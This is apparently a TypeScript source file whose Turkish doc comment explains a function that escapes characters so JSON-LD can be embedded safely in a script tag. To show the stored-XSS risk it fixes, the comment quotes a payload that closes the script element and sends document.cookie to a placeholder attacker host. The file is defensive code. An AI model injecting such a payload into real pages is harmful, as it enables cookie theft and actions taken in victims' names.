/**
 * JSON-LD'nin `<script>` ETIKETI ICINE GUVENLI SERILESTIRILMESI.
 *
 * NEDEN VAR (2026-08-31'de olculdu): on yedi yerde JSON-LD soyle basiliyordu:
 *
 *     <script type="application/ld+json"
 *       dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
 *
 * `JSON.stringify` gecerli JSON uretir ama `<` KARAKTERINI KACIRMAZ -- HTML
 * baglamini hic bilmez. `dangerouslySetInnerHTML` de adinin soyledigi gibi
 * hicbir sey kacirmaz. Yani govdedeki bir dize `</script>` icerirse, tarayici o
 * noktada script'i KAPATIR ve devamini HTML olarak ayristirir.
 *
 * ISTISMAR YOLU somut: `shop.name` ve `shop.address` JSON-LD'ye dogrudan
 * giriyor (`src/lib/shop-json-ld.ts`) ve ikisi de ESNAF KONTROLUNDE
 * (`updateShopSettingsAction`). Bir esnaf dukkan adini soyle yazarsa:
 *
 *     </script><script>fetch('https://kotu/'+document.cookie)</script>
 *
 * ...o dukkanin sayfasini acan HERKES bu script'i calistirir. Ve calisir:
 * `next.config.ts` icindeki CSP `script-src`'de `'unsafe-inline'` var (Next'in
 * kendi acilis script'leri icin, nonce'a gecilene kadar bilincli bir taviz).
 *
 * Oturum cerezi `httpOnly` -- yani cerez calinmaz. Ama saldirgan kurbanin
 * tarayicisinda DOM'u okuyabilir ve onun adina server action cagirabilir; o
 * sayfayi acan bir YONETICI icin bu, yonetici yetkisiyle istek demek.
 *
 * KACIRILAN KARAKTERLER ve nedenleri:
 *   `<`  -> `\\u003c`  `</script>` ile baglamdan cikisi engeller (asil olan bu)
 *   `>`  -> `\\u003e`  `]]>` gibi dizilerle XHTML/CDATA baglamini korur
 *   `&`  -> `\\u0026`  HTML varlik ayristirmasi
 *   U+2028 / U+2029    JSON'da gecerli, JavaScript'te SATIR SONU sayilir
 *
 * Dordu de JSON dizesi ICINDE `\\uXXXX` kacisiyla yazildiginda anlami
 * DEGISMEZ: `JSON.parse` ayni dizeyi uretir, yani schema.org ciktisi birebir
 * ayni kalir. Yalnizca HTML ayristiricisi artik onlari sinir sanmaz.
 */
export function serializeJsonLd(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
